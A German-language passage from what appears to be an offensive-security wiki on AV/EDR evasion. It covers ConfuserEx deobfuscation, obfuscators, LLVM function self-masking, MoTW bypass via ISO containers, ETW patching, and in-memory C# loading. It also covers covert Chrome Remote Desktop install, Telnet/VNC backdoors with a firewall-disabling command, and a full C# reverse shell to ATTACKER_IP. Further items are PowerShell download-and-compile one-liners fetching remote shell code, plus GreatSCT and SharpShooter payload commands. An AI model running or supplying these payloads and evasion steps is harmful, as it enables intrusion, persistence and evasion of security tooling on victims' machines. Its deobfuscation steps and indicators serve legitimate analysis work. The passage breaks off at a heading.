1.  Anti-Tampering entfernen – ConfuserEx verschlüsselt jeden *Methodenkörper* und entschlüsselt ihn im statischen Konstruktor des *Moduls* (`<Module>.cctor`). Außerdem wird die PE-Prüfsumme geändert, sodass jede Modifikation zum Absturz der Binärdatei führt. Verwende **AntiTamperKiller**, um die verschlüsselten Metadatentabellen zu finden, die XOR-Schlüssel wiederherzustellen und eine bereinigte Assembly neu zu schreiben:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen Unpackers nützlich sein können.

2.  Wiederherstellung von Symbolen und Kontrollfluss – übergib die *bereinigte* Datei an **de4dot-cex** (einen ConfuserEx-fähigen Fork von de4dot).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – das ConfuserEx-2-Profil auswählen
     • de4dot macht control-flow flattening rückgängig, stellt ursprüngliche Namespaces, Klassen und Variablennamen wieder her und entschlüsselt konstante Zeichenfolgen.

3.  Proxy-call stripping – ConfuserEx ersetzt direkte Methodenaufrufe durch einfache Wrapper (auch *proxy calls* genannt), um die Decompilierung weiter zu erschweren. Entferne sie mit **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Nach diesem Schritt solltest du normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` statt undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …) sehen.

4.  Manuelle Bereinigung – führe die resultierende Binärdatei unter dnSpy aus und suche nach großen Base64-Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um die *eigentliche* Payload zu finden. Oft speichert die Malware sie als TLV-codiertes Byte-Array, das in `<Module>.byte_0` initialisiert wird.

Diese Kette stellt den Ausführungsfluss wieder her, **ohne** das bösartige Sample ausführen zu müssen – nützlich bei der Arbeit an einer Offline-Workstation.

> 🛈  ConfuserEx erzeugt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu triagieren.

#### Einzeiler
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#-Obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/)-Compiler-Suite bereitzustellen, der durch [Code-Obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Manipulationsschutz für mehr Softwaresicherheit sorgen kann.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator zeigt, wie sich mit der Sprache `C++11/14` zur Compile-Zeit obfuskierter Code erzeugen lässt, ohne externe Tools zu verwenden oder den Compiler zu ändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Ebene obfuskierter Operationen hinzu, die vom C++-Template-Metaprogramming-Framework generiert werden und es der Person, die die Anwendung knacken möchte, etwas schwerer machen.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64-Binary-Obfuscator, der verschiedene PE-Dateien obfuskieren kann, darunter .exe, .dll und .sys.
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache Engine für metamorphic code für beliebige ausführbare Dateien.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein Framework für feingranulare Code-Obfuscation in von LLVM unterstützten Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfuskiert Programme auf Assembly-Code-Ebene, indem reguläre Instruktionen in ROP-Chains umgewandelt werden. Dadurch wird unser intuitives Verständnis eines normalen Kontrollflusses untergraben.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein in Nim geschriebener .NET-PE-Crypter.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann vorhandene EXE/DLL-Dateien in shellcode umwandeln und anschließend laden.

### LLVM-Compiler-gestütztes Self-Masking pro Funktion

Anstatt ein gesamtes Implant nur während des Ruhezustands zu maskieren, kann ein modifiziertes LLVM-X86-Backend ausgewählte Funktionen mit XOR maskiert halten, solange sie inaktiv sind. Der Function-Peekaboo-PoC wählt demangelte Namen aus, die `REG_` enthalten, fügt positionsunabhängige Entry-/Exit-Stubs um den endgültigen Maschinencode ein und gibt einen gemeinsamen Masking-Handler in `.text` aus. Signaturen auf Quellcode-Ebene und die Windows-x64-Aufrufkonvention bleiben unverändert.<sup>[[38]](#references)[[39]](#references)</sup>

#### Kontrollfluss-Transformation im Backend

Diese Transformation gehört hinter die Instruktionsauswahl und Optimierung, da sie **jeden erzeugten Return** abdecken und das genaue x86-Layout kennen muss. Ein `MachineFunctionPass` vor der Codeausgabe findet die letzte `MachineInstr::isReturn()`, löscht sie, sodass der letzte Pfad in den angehängten Epilog fällt, und ersetzt frühere Returns durch `JMP_1 handler`. Compiler-generiertes Stack-/Frame-Teardown vor jedem Return muss erhalten bleiben; umgeleitet wird nur die Return-Instruktion selbst.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` und `emitFunctionBodyEnd()` geben die Stubs pro Funktion aus, während `emitEndOfAsmFile()` den Handler ausgibt. Symbole, die von mehreren Ausgabeschritten gemeinsam verwendet werden, ermöglichen es einem Prolog-Branch, auf seinen späteren Epilog zu verweisen. Für ein manuell ausgegebenes near `je` werden `0F 84` gefolgt vom vier Byte langen MC-Ausdruck `target - address_after_je` geschrieben. Aufrufe und Sprünge zum Handler können stattdessen als `MCInst`-Objekte ausgegeben werden (`CALL64pcrel32` und `JMP_1`). Ein Pass muss für eine nicht ausgewählte Funktion `false` zurückgeben, wenn er nichts geändert hat; der PoC gibt auf diesem Pfad fälschlicherweise `true` zurück.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadaten und Pre-CRT-Initialisierung

Der PoC legt einen XOR-Schlüssel und 16-Byte-Datensätze in `.funcmeta` ab, die einen vom Loader relocierten Funktionszeiger sowie eine Laufzeitlänge enthalten. Obwohl das C-Feld ein `uint32_t` ist, greift der Handler bei Datensatz-Offset `+8` auf ein QWORD zu, das die Länge und deren Padding umfasst, und rückt Datensatz für Datensatz um `0x10` weiter. PE-Abschnittsnamen sind nur acht Byte lang, daher sieht die Laufzeitabfrage `.funcmet`. Ein externer Patcher fügt ein ausführbares `.stub` hinzu, speichert die alte Entry-Point-RVA im Stub und leitet `AddressOfEntryPoint` um. Der PIC-Stub ermittelt die Image Base über `gs:[0x60]` → `[PEB+0x10]`, durchsucht die PE32+-Imports, um eine bereits importierte `VirtualProtect` aufzulösen, und wird vor der CRT ausgeführt.<sup>[[38]](#references)[[39]](#references)</sup>

Bei der Initialisierung wird in `gs:[0xE8]` ein Sentinel gesetzt und jede Metadatenfunktion aufgerufen. Ihr permanent lesbarer Prolog speichert den Funktionsanfang in `gs:[0xF0]`, erkennt den Sentinel und überspringt den noch unmaskierten Funktionsrumpf. Der Epilog verwendet anschließend `call handler`. Nachdem der Handler 13 Register (`0x68` Byte) gesichert hat, enthält die Rücksprungadresse bei `[rsp+0x68]` das Ende der transformierten Funktion. Daher kann `end - start` in den zugehörigen Metadatensatz geschrieben werden. Der Stub löscht den Sentinel und springt nach dem Maskieren aller Funktionsrümpfe zu `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Bei einem normalen Aufruf ruft der Prolog denselben symmetrischen Handler auf, um den Funktionsrumpf zu dekodieren. Der letzte Pfad fällt in den angehängten Epilog, während jeder frühere Return direkt zum gemeinsamen Handler springt. Auch der normale Epilog verwendet `jmp handler` statt `call`. Nach dem erneuten Maskieren verarbeitet das `ret` des Handlers somit die Rücksprungadresse des ursprünglichen Aufrufers und erhält das Funktionsergebnis in `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Maskierungsprimitive und Analyseindikatoren

Der Handler findet den aktuellen Datensatz, überspringt den festen sichtbaren Prolog (in diesem Build `0x46` Byte), ändert den Schutz des restlichen Bereichs auf `PAGE_EXECUTE_READWRITE`, XORt ihn byteweise mit dem niederwertigen Schlüsselbyte und setzt den Schutz anschließend auf `PAGE_EXECUTE_READ`. Dieselbe Schleife dekodiert daher beim Eintritt und kodiert bei jedem normalen Verlassen erneut.<sup>[[38]](#references)[[39]](#references)</sup>

Aussagekräftige Indikatoren für dieses Design sind:<sup>[[38]](#references)[[39]](#references)</sup>

- ein Entry Point innerhalb eines ausführbaren `.stub` und ein `.funcmet`-Abschnitt mit einem Schlüssel sowie relocierten `.text`-Zeigern;
- PEB-, Importtabellen- und Abschnittstabellen-Parsing vor der CRT, gefolgt von Aufrufen über jeden Metadatenzeiger;
- identische `call`/`pop`-PIC-Prologe und zahlreiche Return-Stellen, die zu einem Handler umgeleitet werden;
- Schreibzugriffe auf `gs:[0xE8]`, `gs:[0xF0]` und `gs:[0xF8]`, gefolgt von wiederholten `VirtualProtect`-Übergängen und byteweisen XOR-Schreibzugriffen in ausführbare, vom Image unterstützte Seiten.

Dies ist eine Umgehung von Memory-Scannern, kein kryptografischer Schutz: Die gepatchte Datei enthält den ursprünglichen unverschlüsselten Funktionsrumpf weiterhin, und ein Debugger kann bei `VirtualProtect` oder der XOR-Schleife anhalten und die aktive Funktion ausgeben. Das Ein-Byte-XOR, die lesbaren Metadaten und die feste Grenze von `0x46` machen auch eine Offline-Wiederherstellung einfach.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Die TEB-Slots des PoC sind threadlokal, die modifizierten Code-Seiten jedoch prozessweit. Bei gleichzeitigem oder rekursivem Eintritt können Instruktionen daher erneut umgeschaltet werden, während ein anderer Aufruf sie ausführt. Auch Exceptions und nichtlokale Exits können das erneute Maskieren umgehen. Eine robuste Implementierung muss Übergänge synchronisieren, den Schutz wiederherstellen, der tatsächlich über `lpflOldProtect` zurückgegeben wurde, fest codierte Stub-Längen vermeiden, sowohl `call`- als auch `jmp`-Pfade auf x64-Stack-Alignment prüfen und nach dem Umschreiben ausführbarer Bytes `FlushInstructionCache` aufrufen. Microsoft überträgt dem Aufrufer ausdrücklich die Verantwortung für die Kohärenz des Instruktionscaches, wenn ausführbarer Code geändert wird.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Vielleicht ist Ihnen dieser Bildschirm schon einmal begegnet, wenn Sie ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt haben.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der Endanwender davor schützen soll, potenziell schädliche Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen arbeitet hauptsächlich mit einem reputationsbasierten Ansatz. Das bedeutet, dass bei selten heruntergeladenen Anwendungen SmartScreen ausgelöst wird, wodurch der Endanwender gewarnt und daran gehindert wird, die Datei auszuführen (die Datei lässt sich jedoch weiterhin über „More Info“ -> „Run anyway“ ausführen).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch erstellt wird und die URL enthält, von der die Datei heruntergeladen wurde.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfen des Zone.Identifier ADS einer aus dem Internet heruntergeladenen Datei.</p></figcaption></figure>

> [!TIP]
> Wichtig ist, dass mit einem **vertrauenswürdigen** Signaturzertifikat signierte ausführbare Dateien **SmartScreen nicht auslösen**.

Eine sehr effektive Möglichkeit, zu verhindern, dass Ihre Payloads den Mark of The Web erhalten, ist, sie in einem Container wie einer ISO-Datei zu verpacken. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **Nicht-NTFS**-Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das Payloads in Ausgabecontainern verpackt, um Mark-of-the-Web zu umgehen.

Beispielverwendung:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hier ist eine Demo zum Umgehen von SmartScreen, indem Payloads mit [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) in ISO-Dateien verpackt werden.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsstarker Protokollierungsmechanismus in Windows, mit dem Anwendungen und Systemkomponenten **Ereignisse protokollieren** können. Sicherheitsprodukte können ihn jedoch auch verwenden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (umgangen) wird, ist es auch möglich, die Funktion **`EtwEventWrite`** des User-Space-Prozesses sofort zurückkehren zu lassen, ohne Ereignisse zu protokollieren. Dazu wird die Funktion im Speicher gepatcht, sodass sie sofort zurückkehrt und die ETW-Protokollierung für diesen Prozess effektiv deaktiviert.

Weitere Informationen findest du unter **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) und [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Das Laden von C#-Binaries in den Speicher ist schon seit geraumer Zeit bekannt und ist nach wie vor eine sehr gute Möglichkeit, deine Post-Exploitation-Tools auszuführen, ohne von AV entdeckt zu werden.

Da die Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc usw.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen. Es gibt jedoch verschiedene Möglichkeiten dafür:

- **Fork\&Run**

Dabei wird **ein neuer sacrificial process gestartet**, dein bösartiger Post-Exploitation-Code in diesen neuen Prozess injiziert, der bösartige Code ausgeführt und anschließend der neue Prozess beendet. Das hat sowohl Vor- als auch Nachteile. Der Vorteil der Fork-and-Run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implant-Prozesses stattfindet. Das bedeutet: Wenn bei unserer Post-Exploitation-Aktion etwas schiefgeht oder entdeckt wird, ist die **Wahrscheinlichkeit deutlich höher**, dass unser **Implant überlebt.** Der Nachteil ist, dass die **Wahrscheinlichkeit höher ist**, von **Behavioural Detections** entdeckt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der bösartige Post-Exploitation-Code **in den eigenen Prozess** injiziert. So musst du keinen neuen Prozess erstellen, der von AV gescannt werden könnte. Der Nachteil ist, dass bei Problemen während der Ausführung deiner Payload die **Wahrscheinlichkeit deutlich höher ist**, deinen **Beacon zu verlieren**, da der Prozess abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C#-Assemblies erfahren möchtest, lies diesen Artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und sieh dir den InlineExecute-Assembly BOF an ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Du kannst C#-Assemblies auch **über PowerShell** laden. Sieh dir [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [das Video von S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk) an.

## Andere Programmiersprachen verwenden

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, lässt sich bösartiger Code auch mit anderen Sprachen ausführen, indem dem kompromittierten Computer Zugriff **auf die Interpreter-Umgebung gewährt wird, die sich auf der vom Angreifer kontrollierten SMB-Freigabe befindet**.

Indem du Zugriff auf die Interpreter-Binaries und die Umgebung auf der SMB-Freigabe gewährst, kannst du **beliebigen Code in diesen Sprachen im Speicher** des kompromittierten Computers ausführen.

Laut dem Repository scannt Defender die Skripte weiterhin. Durch die Verwendung von Go, Java, PHP usw. haben wir jedoch **mehr Flexibilität, statische Signaturen zu umgehen**. Tests mit zufälligen, nicht verschleierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## TokenStomping

Token stomping manipuliert das Zugriffstoken eines Sicherheitsprodukts wie EDR oder AV. Wenn die Berechtigungen des Tokens verringert werden, kann der Prozess weiterlaufen, ohne privilegierte Prüf- oder Behebungsmaßnahmen durchführen zu können.

Um dies zu verhindern, könnte Windows **externen Prozessen verbieten**, Handles für die Tokens von Sicherheitsprozessen zu erhalten.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Vertrauenswürdige Software verwenden

### Chrome Remote Desktop

Wie in [**diesem Blogbeitrag**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, lässt sich Chrome Remote Desktop ganz einfach auf dem PC eines Opfers installieren und anschließend dazu verwenden, die Kontrolle zu übernehmen und Persistenz einzurichten:<sup>[[35]](#references)</sup>
1. Lade es von https://remotedesktop.google.com/ herunter, klicke auf „Set up via SSH“ und anschließend auf die MSI-Datei für Windows, um sie herunterzuladen.
2. Führe das Installationsprogramm unbemerkt auf dem Rechner des Opfers aus (Administratorrechte erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Kehre zur Chrome-Remote-Desktop-Seite zurück und klicke auf „Next“. Der Assistent fordert dich dann zur Autorisierung auf. Klicke auf „Authorize“, um fortzufahren.
4. Führe den bereitgestellten Befehl mit den erforderlichen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (mit dem Parameter `--pin` wird die PIN ohne Verwendung der GUI festgelegt).
 

## Erweiterte Evasion

Evasion ist ein sehr komplexes Thema. Manchmal musst du zahlreiche verschiedene Telemetriequellen in einem einzigen System berücksichtigen. Daher ist es in ausgereiften Umgebungen praktisch unmöglich, vollständig unentdeckt zu bleiben.

Jede Umgebung, gegen die du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dir dringend, dir diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittenere Evasion-Techniken zu erhalten.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dies ist ein weiterer großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Ältere Techniken**

### **Prüfen, welche Teile Defender als bösartig erkennt**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden. Das Tool **entfernt Teile des Binaries**, bis es **herausfindet, welchen Teil Defender** als bösartig erkennt, und isoliert diesen für dich.\
Ein weiteres Tool, das **dasselbe tut, ist** [**avred**](https://github.com/dobin/avred). Es bietet den Dienst online unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) an.

### **Telnet-Server**

Bis einschließlich Windows 10 verfügten alle Windows-Versionen über einen **Telnet-Server**, den du (als Administrator) folgendermaßen installieren konntest:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Lass es beim Systemstart **starten** und **führe** es jetzt aus:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Telnet-Port ändern** (stealth) und Firewall deaktivieren:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Lade es hier herunter: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du benötigst die Bin-Downloads, nicht das Setup)

**AUF DEM HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Lege unter _VNC Password_ ein Passwort fest
- Lege unter _View-Only Password_ ein Passwort fest

Verschiebe dann die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ auf den **Victim**

#### **Reverse-Verbindung**

Der **Angreifer** sollte auf seinem **Host** die Binärdatei `vncviewer.exe -listen 5900` ausführen, damit er bereit ist, eine Reverse-**VNC-Verbindung** entgegenzunehmen. Starte dann auf dem **Victim** den winvnc daemon mit `winvnc.exe -run` und führe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus.

**WARNUNG:** Um Stealth zu wahren, darfst du einige Dinge nicht tun:

- Starte `winvnc` nicht, wenn es bereits läuft, sonst wird ein [Popup](https://i.imgur.com/1SROTTl.png) ausgelöst. Prüfe mit `tasklist | findstr winvnc`, ob es läuft.
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, sonst wird [das Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png) geöffnet.
- Führe `winvnc -h` nicht für Hilfe aus, sonst wird ein [Popup](https://i.imgur.com/oc18wcu.png) ausgelöst.

### GreatSCT

Lade es hier herunter: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

In GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Starte nun den **Listener** mit `msfconsole -r file.rc` und **führe** die **XML-Payload** aus mit:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Der aktuelle Defender beendet den Prozess sehr schnell.**

### Unsere eigene Reverse Shell kompilieren

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C#-Revershell

Kompiliere sie mit:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Verwende es mit:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# mit Compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C#-Obfuscator-Liste: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Beispiel für die Verwendung von Python zum Erstellen von Injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Weitere Tools

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR aus dem Kernel-Space ausschalten

